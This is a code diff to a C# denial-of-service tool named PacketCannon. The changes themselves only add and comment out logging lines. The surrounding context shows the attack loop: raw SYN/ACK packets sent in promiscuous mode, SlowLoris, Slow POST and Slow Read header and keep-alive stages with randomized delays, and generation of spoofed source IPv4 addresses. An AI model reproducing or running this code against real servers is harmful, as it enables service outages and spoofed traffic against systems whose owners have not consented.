@@ -107,16 +107,17 @@ namespace PacketCannon
                     dosSender.WindowSize = (ushort)SlowReadWindowSize;
                 }
             }
-            // Random rand = new Random();
-            // var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
-            // var a = File.Create(path);
-            //// a.Close();
+            //Random rand = new Random();
+            //var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
+            //var a = File.Create(path);
+            //a.Close();
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
             using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
             {
                 while (true)
                 {
+                    var logs = "";
                     foreach (var dosSender in dosSenders)
                     {
                         switch (dosSender.Status)
@@ -124,6 +125,7 @@ namespace PacketCannon
                             case SenderStat.SendSyn:
                                 dosSender.SendSyn(Communicator);
                                 dosSender.Status = SenderStat.WaitingForAck;
+                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
                                 break;
 
                             case SenderStat.RecievingSlowRead:
@@ -149,12 +151,14 @@ namespace PacketCannon
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowLoris:
                                 dosSender.SendAck(Communicator);
                                 dosSender.Status = SenderStat.SendingSlowLorisGetHeader;
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SendingLorisHeader";
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowPost:
                                 dosSender.SendAck(Communicator);
                                 dosSender.Status = SenderStat.SedingSlowPostHeader;
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
                                 // using (StreamWriter sw = File.AppendText(path))
                                 // {
                                 //     sw.WriteLine(
@@ -172,7 +176,7 @@ namespace PacketCannon
                                 //     sw.WriteLine(
                                 //         $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowReadGet");
                                 // }
-
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                 break;
 
                             //SLOW-LORIS
@@ -184,7 +188,7 @@ namespace PacketCannon
                                 //     sw.WriteLine(
                                 //         $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowlorisGetHeader");
                                 // }
-
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisGetHeader";
                                 break;
 
                             //SLOW-LORIS
@@ -195,7 +199,7 @@ namespace PacketCannon
                                 //     sw.WriteLine(
                                 //         $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowlorisKeepAlive");
                                 // }
-
+                                // logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisKeepAlive";
                                 break;
 
                             //SLOW-POST
@@ -207,7 +211,7 @@ namespace PacketCannon
                                 //     sw.WriteLine(
                                 //         $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowPostHeader");
                                 // }
-
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
                                 break;
 
                             //SLOW-POST
@@ -218,7 +222,7 @@ namespace PacketCannon
                                 //     sw.WriteLine(
                                 //         $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowPostKeepAlive");
                                 // }
-
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostKeepAlive";
                                 break;
 
                             //SLOW-READ
@@ -231,7 +235,7 @@ namespace PacketCannon
                                 //    sw.WriteLine(
                                 //        $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowReadGet");
                                 //}
-
+                                // logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                 break;
 
                             //SLOW-READ
@@ -243,7 +247,7 @@ namespace PacketCannon
                                 //    sw.WriteLine(
                                 //        $"\n{dosSender.SourcePort}-- {DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture)}-- SlowReadKeepAlive");
                                 //}
-
+                                // logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadKeepAlive";
                                 break;
 
                             default:
@@ -252,6 +256,10 @@ namespace PacketCannon
                         Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
                     }
                     Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
+                    // using (StreamWriter sw = File.AppendText(path))
+                    // {
+                    //     sw.Write(logs);
+                    // }
                 }
             }
         }
@@ -332,7 +340,6 @@ namespace PacketCannon
             while (FakeIpV4Addresses.Count != count)
             {
                 var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rnd.Next(FakeIpAddressMin, FakeIpAddressMax)}");
-                //var ipAddressFaked = new IpV4Address(ipAddress[0] + ipAddress[1] + ipAddress[2] + rnd.Next(FakeIpAddressMin, FakeIpAddressMax));
                 if (!FakeIpV4Addresses.Contains(ipAddressFaked) && !ipAddressFaked.ToString().Equals(SourceIpv4) && !ipAddressFaked.ToString().Equals(DestinationIpV4))
                 {
                     FakeIpV4Addresses.Add(ipAddressFaked);
